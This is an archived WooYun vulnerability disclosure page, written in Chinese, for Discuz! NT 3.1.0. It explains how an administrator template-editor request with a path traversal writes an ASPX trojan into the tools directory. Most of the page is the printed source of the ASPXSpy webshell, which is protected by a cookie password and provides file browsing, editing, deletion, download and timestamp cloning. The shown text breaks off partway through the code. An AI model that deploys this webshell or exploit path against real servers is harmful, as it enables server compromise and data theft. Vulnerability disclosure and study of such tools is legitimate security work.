<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		Discuz! NT 3.1.0 后台拿webshell  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		Discuz! NT 3.1.0 后台拿webshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/webshell">webshell</a> 
</li><li>提交时间：		2011-05-05 08:12</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2011-05-05：	细节已通知厂商并且等待厂商处理中<br/>
									2011-05-05：	厂商已经确认，细节仅向厂商公开<br/>
									2011-05-15：	细节向核心白帽子及相关领域专家公开<br/>
									2011-05-25：	细节向普通白帽子公开<br/>
									2011-06-04：	细节向实习白帽子公开<br/>
									2011-06-04：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">通过后台写入执行代码，直接拿到webshell，从而掌握服务器权限。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">1、访问http://127.0.0.1/admin/global/global_templatesedit.aspx?path=../tools/&amp;filename=rss.aspx&amp;templateid=1&amp;templatename=Default，写入aspx木马。<br />
<br />
2、写入aspx木马后，访问http://127.0.0.1/tools/rss.aspx就可以了。  </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">1、访问http://127.0.0.1/admin/global/global_templatesedit.aspx?path=../tools/&amp;filename=rss.aspx&amp;templateid=1&amp;templatename=Default，写入aspx木马。<br />
<br />
2、写入aspx木马后，访问http://127.0.0.1/tools/rss.aspx就可以了。 <br />
<br />
<br />
<br />
aspx木马：&lt;code&gt;&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; trace=&quot;false&quot; validateRequest=&quot;false&quot; EnableViewStateMac=&quot;false&quot; EnableViewState=&quot;true&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.IO&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.Diagnostics&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.Data&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.Management&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.Data.OleDb&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;Microsoft.Win32&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.Net.Sockets&quot; %&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.Net&quot; %&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.Runtime.InteropServices&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.DirectoryServices&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.ServiceProcess&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;System.Text.RegularExpressions&quot;%&gt;<br />
<br />
&lt;%@ Import Namespace=&quot;System.Threading&quot;%&gt;<br />
<br />
&lt;%@ Import Namespace=&quot;System.Data.SqlClient&quot;%&gt;<br />
<br />
&lt;%@ import Namespace=&quot;Microsoft.VisualBasic&quot;%&gt;<br />
<br />
&lt;%@ Assembly Name=&quot;System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A&quot;%&gt;<br />
<br />
&lt;%@ Assembly Name=&quot;System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A&quot;%&gt;<br />
<br />
&lt;%@ Assembly Name=&quot;System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A&quot;%&gt;<br />
<br />
&lt;%@ Assembly Name=&quot;Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a&quot;%&gt;<br />
<br />
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />
<br />
&lt;script runat=&quot;server&quot;&gt;<br />
<br />
/*<br />
<br />
Thanks Snailsor,FuYu,BloodSword,Cnqing,<br />
<br />
Code by Bin<br />
<br />
Make in China<br />
<br />
Blog: http://www.rootkit.net.cn<br />
<br />
E-mail : master@rootkit.net.cn<br />
<br />
*/<br />
<br />
public string Password=&quot;21232f297a57a5a743894a0e4a801fc3&quot;;//admin<br />
<br />
public string vbhLn=&quot;ASPXSpy&quot;;<br />
<br />
public int TdgGU=1;<br />
<br />
protected OleDbConnection Dtdr=new OleDbConnection();<br />
<br />
protected OleDbCommand Kkvb=new OleDbCommand();<br />
<br />
public NetworkStream NS=null;<br />
<br />
public NetworkStream NS1=null;<br />
<br />
TcpClient tcp=new TcpClient();<br />
<br />
TcpClient zvxm=new TcpClient();<br />
<br />
ArrayList IVc=new ArrayList();<br />
<br />
protected void Page_load(object sender,EventArgs e)<br />
<br />
{<br />
<br />
YFcNP(this);<br />
<br />
fhAEn();<br />
<br />
if (!pdo())<br />
<br />
{<br />
<br />
return;<br />
<br />
}<br />
<br />
if(IsPostBack)<br />
<br />
{<br />
<br />
string tkI=Request[&quot;__EVENTTARGET&quot;];<br />
<br />
string VqV=Request[&quot;__File&quot;];<br />
<br />
if(tkI!=&quot;&quot;)<br />
<br />
{<br />
<br />
switch(tkI)<br />
<br />
{<br />
<br />
case &quot;Bin_Parent&quot;:<br />
<br />
krIR(Ebgw(VqV));<br />
<br />
break;<br />
<br />
case &quot;Bin_Listdir&quot;:<br />
<br />
krIR(Ebgw(VqV));<br />
<br />
break;<br />
<br />
case &quot;kRXgt&quot;:<br />
<br />
kRXgt(Ebgw(VqV));<br />
<br />
break;<br />
<br />
case &quot;Bin_Createfile&quot;:<br />
<br />
gLKc(VqV);<br />
<br />
break;<br />
<br />
case &quot;Bin_Editfile&quot;:<br />
<br />
gLKc(VqV);<br />
<br />
break;<br />
<br />
case &quot;Bin_Createdir&quot;:<br />
<br />
stNPw(VqV);<br />
<br />
break;<br />
<br />
case &quot;cYAl&quot;:<br />
<br />
cYAl(VqV);<br />
<br />
break;<br />
<br />
case &quot;ksGR&quot;:<br />
<br />
ksGR(Ebgw(VqV));<br />
<br />
break;<br />
<br />
case &quot;SJv&quot;:<br />
<br />
SJv(VqV);<br />
<br />
break;<br />
<br />
case &quot;Bin_Regread&quot;:<br />
<br />
tpRQ(Ebgw(VqV));<br />
<br />
break;<br />
<br />
case &quot;hae&quot;:<br />
<br />
hae();<br />
<br />
break;<br />
<br />
case &quot;urJG&quot;:<br />
<br />
urJG(VqV);<br />
<br />
break;<br />
<br />
}<br />
<br />
if(tkI.StartsWith(&quot;dAJTD&quot;))<br />
<br />
{<br />
<br />
dAJTD(Ebgw(tkI.Replace(&quot;dAJTD&quot;,&quot;&quot;)),VqV);<br />
<br />
}<br />
<br />
else if(tkI.StartsWith(&quot;Tlvz&quot;))<br />
<br />
{<br />
<br />
Tlvz(Ebgw(tkI.Replace(&quot;Tlvz&quot;,&quot;&quot;)),VqV);<br />
<br />
}<br />
<br />
else if(tkI.StartsWith(&quot;Bin_CFile&quot;))<br />
<br />
{<br />
<br />
YByN(Ebgw(tkI.Replace(&quot;Bin_CFile&quot;,&quot;&quot;)),VqV);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
PBZw();<br />
<br />
}<br />
<br />
}<br />
<br />
public bool pdo()<br />
<br />
{<br />
<br />
if(Request.Cookies[vbhLn]==null)<br />
<br />
{<br />
<br />
tZSx();<br />
<br />
return false;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
if (Request.Cookies[vbhLn].Value != Password)<br />
<br />
{<br />
<br />
tZSx();<br />
<br />
return false;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
return true;<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
public void tZSx()<br />
<br />
{<br />
<br />
ljtzC.Visible=true;<br />
<br />
ZVS.Visible=false;<br />
<br />
}<br />
<br />
protected void YKpI(object sender,EventArgs e)<br />
<br />
{<br />
<br />
Session.Abandon();<br />
<br />
Response.Cookies.Add(new HttpCookie(vbhLn,null));<br />
<br />
tZSx();<br />
<br />
}<br />
<br />
public void PBZw()<br />
<br />
{<br />
<br />
ZVS.Visible=true;<br />
<br />
ljtzC.Visible=false;<br />
<br />
Bin_Button_CreateFile.Attributes[&quot;onClick&quot;]=&quot;var filename=prompt(&#039;Please input the file name:&#039;,&#039;&#039;);if(filename){Bin_PostBack(&#039;Bin_Createfile&#039;,filename);}&quot;;<br />
<br />
Bin_Button_CreateDir.Attributes[&quot;onClick&quot;]=&quot;var filename=prompt(&#039;Please input the directory name:&#039;,&#039;&#039;);if(filename){Bin_PostBack(&#039;Bin_Createdir&#039;,filename);}&quot;;<br />
<br />
Bin_Button_KillMe.Attributes[&quot;onClick&quot;]=&quot;if(confirm(&#039;Are you sure delete ASPXSPY?&#039;)){Bin_PostBack(&#039;hae&#039;,&#039;&#039;);};&quot;;<br />
<br />
Bin_Span_Sname.InnerHtml=Request.ServerVariables[&quot;LOCAL_ADDR&quot;]+&quot;:&quot;+Request.ServerVariables[&quot;SERVER_PORT&quot;]+&quot;(&quot;+Request.ServerVariables[&quot;SERVER_NAME&quot;]+&quot;)&quot;;<br />
<br />
Bin_Span_FrameVersion.InnerHtml=&quot;Framework Ver : &quot;+Environment.Version.ToString();<br />
<br />
if (AXSbb.Value==string.Empty)<br />
<br />
{<br />
<br />
AXSbb.Value=OElM(Server.MapPath(&quot;.&quot;));<br />
<br />
}<br />
<br />
Bin_H2_Title.InnerText=&quot;File Manager &gt;&gt;&quot;;<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
public void fhAEn()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
string[] YRgt=Directory.GetLogicalDrives();<br />
<br />
for(int i=0;i&lt;YRgt.Length;i++)<br />
<br />
{<br />
<br />
Control c=ParseControl(&quot; &lt;asp:LinkButton Text=&#039;&quot;+mFvj(YRgt[i])+&quot;&#039; ID=\&quot;Bin_Button_Driv&quot;+i+&quot;\&quot; runat=&#039;server&#039; commandargument= &#039;&quot;+YRgt[i]+&quot;&#039;/&gt; | &quot;);<br />
<br />
Bin_Span_Drv.Controls.Add(c);<br />
<br />
LinkButton nxeDR=(LinkButton)Page.FindControl(&quot;Bin_Button_Driv&quot;+i);<br />
<br />
nxeDR.Command+=new CommandEventHandler(this.iVk);<br />
<br />
}<br />
<br />
}catch(Exception ex){}<br />
<br />
}<br />
<br />
public string OElM(string path)<br />
<br />
{<br />
<br />
if(path.Substring(path.Length-1,1)!=@&quot;\&quot;)<br />
<br />
{<br />
<br />
path=path+@&quot;\&quot;;<br />
<br />
}<br />
<br />
return path;<br />
<br />
}<br />
<br />
public string nrrx(string path)<br />
<br />
{<br />
<br />
char[] trim={&#039;\\&#039;};<br />
<br />
if(path.Substring(path.Length-1,1)==@&quot;\&quot;)<br />
<br />
{<br />
<br />
path=path.TrimEnd(trim);<br />
<br />
}<br />
<br />
return path;<br />
<br />
}<br />
<br />
[DllImport(&quot;kernel32.dll&quot;,EntryPoint=&quot;GetDriveTypeA&quot;)]<br />
<br />
public static extern int OMZP(string nDrive);<br />
<br />
public string mFvj(string instr)<br />
<br />
{<br />
<br />
string EuXD=string.Empty;<br />
<br />
int num=OMZP(instr);<br />
<br />
switch(num)<br />
<br />
{<br />
<br />
case 1:<br />
<br />
EuXD=&quot;Unknow(&quot;+instr+&quot;)&quot;;<br />
<br />
break;<br />
<br />
case 2:<br />
<br />
EuXD=&quot;Removable(&quot;+instr+&quot;)&quot;;<br />
<br />
break;<br />
<br />
case 3:<br />
<br />
EuXD=&quot;Fixed(&quot;+instr+&quot;)&quot;;<br />
<br />
break;<br />
<br />
case 4:<br />
<br />
EuXD=&quot;Network(&quot;+instr+&quot;)&quot;;<br />
<br />
break;<br />
<br />
case 5:<br />
<br />
EuXD=&quot;CDRom(&quot;+instr+&quot;)&quot;;<br />
<br />
break;<br />
<br />
case 6:<br />
<br />
EuXD=&quot;RAM Disk(&quot;+instr+&quot;)&quot;;<br />
<br />
break;<br />
<br />
}<br />
<br />
return EuXD.Replace(@&quot;\&quot;,&quot;&quot;);<br />
<br />
}<br />
<br />
public string MVVJ(string instr)<br />
<br />
{<br />
<br />
byte[] tmp=Encoding.Default.GetBytes(instr);<br />
<br />
return Convert.ToBase64String(tmp);<br />
<br />
}<br />
<br />
public string Ebgw(string instr)<br />
<br />
{<br />
<br />
byte[] tmp=Convert.FromBase64String(instr);<br />
<br />
return Encoding.Default.GetString(tmp);<br />
<br />
}<br />
<br />
public void krIR(string path)<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
CzfO.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;File Manager &gt;&gt;&quot;;<br />
<br />
AXSbb.Value=OElM(path);<br />
<br />
DirectoryInfo GQMM=new DirectoryInfo(path);<br />
<br />
if(Directory.GetParent(nrrx(path))!=null)<br />
<br />
{<br />
<br />
string bg=OKM();<br />
<br />
TableRow p=new TableRow();<br />
<br />
for(int i=1;i&lt;6;i++)<br />
<br />
{<br />
<br />
TableCell pc=new TableCell();<br />
<br />
if(i==1)<br />
<br />
{<br />
<br />
pc.Width=Unit.Parse(&quot;2%&quot;);<br />
<br />
pc.Text=&quot;0&quot;;<br />
<br />
p.CssClass=bg;<br />
<br />
}<br />
<br />
if(i==2)<br />
<br />
{<br />
<br />
pc.Text=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;Bin_Parent&#039;,&#039;&quot;+MVVJ(Directory.GetParent(nrrx(path)).ToString())+&quot;&#039;)\&quot;&gt;Parent Directory&lt;/a&gt;&quot;;<br />
<br />
}<br />
<br />
p.Cells.Add(pc);<br />
<br />
UGzP.Rows.Add(p);<br />
<br />
}<br />
<br />
}<br />
<br />
try<br />
<br />
{<br />
<br />
int vLlH=0;<br />
<br />
foreach(DirectoryInfo Bin_folder in GQMM.GetDirectories())<br />
<br />
{<br />
<br />
string bg=OKM();<br />
<br />
vLlH++;<br />
<br />
TableRow tr=new TableRow();<br />
<br />
TableCell tc=new TableCell();<br />
<br />
tc.Width=Unit.Parse(&quot;2%&quot;);<br />
<br />
tc.Text=&quot;0&quot;;<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
TableCell HczyN=new TableCell();<br />
<br />
HczyN.Text=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;Bin_Listdir&#039;,&#039;&quot;+MVVJ(AXSbb.Value+Bin_folder.Name)+&quot;&#039;)\&quot;&gt;&quot;+Bin_folder.Name+&quot;&lt;/a&gt;&quot;;<br />
<br />
tr.Cells.Add(HczyN);<br />
<br />
TableCell LYZK=new TableCell();<br />
<br />
LYZK.Text=Bin_folder.LastWriteTimeUtc.ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;);<br />
<br />
tr.Cells.Add(LYZK);<br />
<br />
UGzP.Rows.Add(tr);<br />
<br />
TableCell ERUL=new TableCell();<br />
<br />
ERUL.Text=&quot;--&quot;;<br />
<br />
tr.Cells.Add(ERUL);<br />
<br />
UGzP.Rows.Add(tr);<br />
<br />
TableCell ZGKh=new TableCell();<br />
<br />
ZGKh.Text=&quot;&lt;a href=\&quot;javascript:if(confirm(&#039;Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.&#039;)){Bin_PostBack(&#039;kRXgt&#039;,&#039;&quot;+MVVJ(AXSbb.Value+Bin_folder.Name)+&quot;&#039;)};\&quot;&gt;Del&lt;/a&gt; | &lt;a href=&#039;#&#039; onclick=\&quot;var filename=prompt(&#039;Please input the new folder name:&#039;,&#039;&quot;+AXSbb.Value.Replace(@&quot;\&quot;,@&quot;\\&quot;)+Bin_folder.Name.Replace(&quot;&#039;&quot;,&quot;\\&#039;&quot;)+&quot;&#039;);if(filename){Bin_PostBack(&#039;dAJTD&quot;+MVVJ(AXSbb.Value+Bin_folder.Name)+&quot;&#039;,filename);} \&quot;&gt;Rename&lt;/a&gt;&quot;;<br />
<br />
tr.Cells.Add(ZGKh);<br />
<br />
UGzP.Rows.Add(tr);<br />
<br />
}<br />
<br />
TableRow cKVA=new TableRow();<br />
<br />
cKVA.Attributes[&quot;style&quot;]=&quot;border-top:1px solid #fff;border-bottom:1px solid #ddd;&quot;;<br />
<br />
cKVA.Attributes[&quot;bgcolor&quot;]=&quot;#dddddd&quot;;<br />
<br />
TableCell JlmW=new TableCell();<br />
<br />
JlmW.Attributes[&quot;colspan&quot;]=&quot;6&quot; ;<br />
<br />
JlmW.Attributes[&quot;height&quot;]=&quot;5&quot;;<br />
<br />
cKVA.Cells.Add(JlmW);<br />
<br />
UGzP.Rows.Add(cKVA);<br />
<br />
int aYRwo=0;<br />
<br />
foreach(FileInfo Bin_Files in GQMM.GetFiles())<br />
<br />
{<br />
<br />
aYRwo++;<br />
<br />
string gb=OKM();<br />
<br />
TableRow tr=new TableRow();<br />
<br />
TableCell tc=new TableCell();<br />
<br />
tc.Width=Unit.Parse(&quot;2%&quot;);<br />
<br />
tc.Text=&quot;&lt;input type=\&quot;checkbox\&quot; value=\&quot;0\&quot; name=\&quot;&quot;+MVVJ(Bin_Files.Name)+&quot;\&quot;&gt;&quot;;<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=gb;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+gb+&quot;&#039;;&quot;;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
TableCell filename=new TableCell();<br />
<br />
if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))<br />
<br />
{<br />
<br />
string url=Request.Url.ToString();<br />
<br />
filename.Text=&quot;&lt;a href=\&quot;&quot;+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf(&#039;/&#039;,8)+1)).Replace(&quot;\\&quot;,&quot;/&quot;)+&quot;\&quot; target=\&quot;_blank\&quot;&gt;&quot;+Bin_Files.Name+&quot;&lt;/a&gt;&quot;;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
filename.Text=Bin_Files.Name;<br />
<br />
}<br />
<br />
TableCell albt=new TableCell();<br />
<br />
albt.Text=Bin_Files.LastWriteTimeUtc.ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;);<br />
<br />
TableCell YzK=new TableCell();<br />
<br />
YzK.Text=mTG(Bin_Files.Length);<br />
<br />
TableCell GLpi=new TableCell();<br />
<br />
GLpi.Text=&quot;&lt;a href=\&quot;#\&quot; onclick=\&quot;Bin_PostBack(&#039;ksGR&#039;,&#039;&quot;+MVVJ(AXSbb.Value+Bin_Files.Name)+&quot;&#039;)\&quot;&gt;Down&lt;/a&gt; | &lt;a href=&#039;#&#039; onclick=\&quot;var filename=prompt(&#039;Please input the new path(full path):&#039;,&#039;&quot;+AXSbb.Value.Replace(@&quot;\&quot;,@&quot;\\&quot;)+Bin_Files.Name.Replace(&quot;&#039;&quot;,&quot;\\&#039;&quot;)+&quot;&#039;);if(filename){Bin_PostBack(&#039;Bin_CFile&quot;+MVVJ(AXSbb.Value+Bin_Files.Name)+&quot;&#039;,filename);} \&quot;&gt;Copy&lt;/a&gt; | &lt;a href=\&quot;#\&quot; onclick=\&quot;Bin_PostBack(&#039;Bin_Editfile&#039;,&#039;&quot;+Bin_Files.Name+&quot;&#039;)\&quot;&gt;Edit&lt;/a&gt; | &lt;a href=&#039;#&#039; onclick=\&quot;var filename=prompt(&#039;Please input the new file name(full path):&#039;,&#039;&quot;+AXSbb.Value.Replace(@&quot;\&quot;,@&quot;\\&quot;)+Bin_Files.Name.Replace(&quot;&#039;&quot;,&quot;\\&#039;&quot;)+&quot;&#039;);if(filename){Bin_PostBack(&#039;Tlvz&quot;+MVVJ(AXSbb.Value+Bin_Files.Name)+&quot;&#039;,filename);} \&quot;&gt;Rename&lt;/a&gt; | &lt;a href=\&quot;#\&quot; onclick=\&quot;Bin_PostBack(&#039;cYAl&#039;,&#039;&quot;+Bin_Files.Name+&quot;&#039;)\&quot;&gt;Time&lt;/a&gt; &quot;;<br />
<br />
tr.Cells.Add(filename);<br />
<br />
tr.Cells.Add(albt);<br />
<br />
tr.Cells.Add(YzK);<br />
<br />
tr.Cells.Add(GLpi);<br />
<br />
UGzP.Rows.Add(tr);<br />
<br />
}<br />
<br />
string lgb=OKM();<br />
<br />
TableRow oWam=new TableRow();<br />
<br />
oWam.CssClass=lgb;<br />
<br />
for(int i=1;i&lt;4;i++)<br />
<br />
{<br />
<br />
TableCell lGV=new TableCell();<br />
<br />
if(i==1)<br />
<br />
{<br />
<br />
lGV.Text=&quot;&lt;input name=\&quot;chkall\&quot; value=\&quot;on\&quot; type=\&quot;checkbox\&quot; onclick=\&quot;var ck=document.getElementsByTagName(&#039;input&#039;);for(var i=0;i&lt;ck.length-1;i++){if(ck[i].type==&#039;checkbox&#039;&amp;&amp;ck[i].name!=&#039;chkall&#039;){ck[i].checked=forms[0].chkall.checked;}}\&quot;/&gt;&quot;;<br />
<br />
}<br />
<br />
if(i==2)<br />
<br />
{<br />
<br />
lGV.Text=&quot;&lt;a href=\&quot;#\&quot; Onclick=\&quot;var d_file=&#039;&#039;;var ck=document.getElementsByTagName(&#039;input&#039;);for(var i=0;i&lt;ck.length-1;i++){if(ck[i].checked&amp;&amp;ck[i].name!=&#039;chkall&#039;){d_file+=ck[i].name+&#039;,&#039;;}};if(d_file==null || d_file==&#039;&#039;){ return;} else {if(confirm(&#039;Are you sure delete the files ?&#039;)){Bin_PostBack(&#039;SJv&#039;,d_file)};}\&quot;&gt;Delete selected&lt;/a&gt;&quot;;<br />
<br />
}<br />
<br />
if(i==3)<br />
<br />
{<br />
<br />
lGV.ColumnSpan=4;<br />
<br />
lGV.Style.Add(&quot;text-align&quot;,&quot;right&quot;);<br />
<br />
lGV.Text=vLlH+&quot; directories/ &quot;+aYRwo+&quot; files&quot;;<br />
<br />
}<br />
<br />
oWam.Cells.Add(lGV);<br />
<br />
}<br />
<br />
UGzP.Rows.Add(oWam);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public string OKM()<br />
<br />
{<br />
<br />
TdgGU++;<br />
<br />
if(TdgGU % 2==0)<br />
<br />
{<br />
<br />
return &quot;alt1&quot;;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
return &quot;alt2&quot;;<br />
<br />
}<br />
<br />
}<br />
<br />
public void kRXgt(string qcKu)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Directory.Delete(qcKu,true);<br />
<br />
xseuB(&quot;Directory delete new success !&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(Directory.GetParent(qcKu).ToString());<br />
<br />
}<br />
<br />
public void dAJTD(string sdir,string ddir)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Directory.Move(sdir,ddir);<br />
<br />
xseuB(&quot;Directory Renamed Success !&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
public void Tlvz(string sfile,string dfile)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
File.Move(sfile,dfile);<br />
<br />
xseuB(&quot;File Renamed Success !&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
public void YByN(string spath,string dpath)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
File.Copy(spath,dpath);<br />
<br />
xseuB(&quot;File Copy Success !&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
public void stNPw(string path)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Directory.CreateDirectory(AXSbb.Value+path);<br />
<br />
xseuB(&quot;Directory created success !&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
public void gLKc(string path)<br />
<br />
{<br />
<br />
if(Request[&quot;__EVENTTARGET&quot;]==&quot;Bin_Editfile&quot; || Request[&quot;__EVENTTARGET&quot;]==&quot;Bin_Createfile&quot;)<br />
<br />
{<br />
<br />
foreach(ListItem item in NdCX.Items)<br />
<br />
{<br />
<br />
if(item.Selected=true)<br />
<br />
{<br />
<br />
item.Selected=false;<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
Bin_H2_Title.InnerHtml=&quot;Create/ Edit File &gt;&gt;&quot;;<br />
<br />
WICxe();<br />
<br />
vrFA.Visible=true;<br />
<br />
if(path.IndexOf(&quot;:&quot;)&lt; 0)<br />
<br />
{<br />
<br />
Sqon.Value=AXSbb.Value+path;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
Sqon.Value=path;<br />
<br />
}<br />
<br />
if(File.Exists(Sqon.Value))<br />
<br />
{<br />
<br />
StreamReader sr;<br />
<br />
if(NdCX.SelectedItem.Text==&quot;UTF-8&quot;)<br />
<br />
{<br />
<br />
sr=new StreamReader(Sqon.Value,Encoding.UTF8);<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
sr=new StreamReader(Sqon.Value,Encoding.Default);<br />
<br />
}<br />
<br />
Xgvv.InnerText=sr.ReadToEnd();<br />
<br />
sr.Close();<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
Xgvv.InnerText=string.Empty;<br />
<br />
}<br />
<br />
}<br />
<br />
public void ksGR(string path)<br />
<br />
{<br />
<br />
FileInfo fs=new FileInfo(path);<br />
<br />
Response.Clear();<br />
<br />
Page.Response.ClearHeaders();<br />
<br />
Page.Response.Buffer=false;<br />
<br />
this.EnableViewState=false;<br />
<br />
Response.AddHeader(&quot;Content-Disposition&quot;,&quot;attachment;filename=&quot;+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));<br />
<br />
Response.AddHeader(&quot;Content-Length&quot;,fs.Length.ToString());<br />
<br />
Page.Response.ContentType=&quot;application/unknown&quot;;<br />
<br />
Response.WriteFile(fs.FullName);<br />
<br />
Page.Response.Flush();<br />
<br />
Page.Response.Close();<br />
<br />
Response.End();<br />
<br />
Page.Response.Clear();<br />
<br />
}<br />
<br />
public void SJv(string path)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
string[] spdT=path.Split(&#039;,&#039;);<br />
<br />
for(int i=0;i&lt;spdT.Length-1;i++)<br />
<br />
{<br />
<br />
File.Delete(AXSbb.Value+Ebgw(spdT[i]));<br />
<br />
}<br />
<br />
xseuB(&quot;File Delete Success !&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
public void hae()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
File.Delete(Request.PhysicalPath);<br />
<br />
Response.Redirect(&quot;http://www.rootkit.net.cn&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public void cYAl(string path)<br />
<br />
{<br />
<br />
Bin_H2_Title.InnerHtml=&quot;Clone file was last modified time &gt;&gt;&quot;;<br />
<br />
WICxe();<br />
<br />
zRyG.Visible=true;<br />
<br />
QiFB.Value=AXSbb.Value+path;<br />
<br />
lICp.Value=AXSbb.Value;<br />
<br />
pWVL.Value=AXSbb.Value+path;<br />
<br />
string Att=File.GetAttributes(QiFB.Value).ToString();<br />
<br />
if(Att.LastIndexOf(&quot;ReadOnly&quot;)!=-1)<br />
<br />
{<br />
<br />
ZhWSK.Checked=true;<br />
<br />
}<br />
<br />
if(Att.LastIndexOf(&quot;System&quot;)!=-1)<br />
<br />
{<br />
<br />
SsR.Checked=true;<br />
<br />
}<br />
<br />
if(Att.LastIndexOf(&quot;Hidden&quot;)!=-1)<br />
<br />
{<br />
<br />
ccB.Checked=true;<br />
<br />
}<br />
<br />
if(Att.LastIndexOf(&quot;Archive&quot;)!=-1)<br />
<br />
{<br />
<br />
fbyZ.Checked=true;<br />
<br />
}<br />
<br />
yUqx.Value=File.GetCreationTimeUtc(pWVL.Value).ToString();<br />
<br />
uYjw.Value=File.GetLastWriteTimeUtc(pWVL.Value).ToString();<br />
<br />
aLsn.Value=File.GetLastAccessTimeUtc(pWVL.Value).ToString();<br />
<br />
}<br />
<br />
public static String mTG(Int64 fileSize)<br />
<br />
{<br />
<br />
if(fileSize&lt;0)<br />
<br />
{<br />
<br />
throw new ArgumentOutOfRangeException(&quot;fileSize&quot;);<br />
<br />
}<br />
<br />
else if(fileSize &gt;= 1024 * 1024 * 1024)<br />
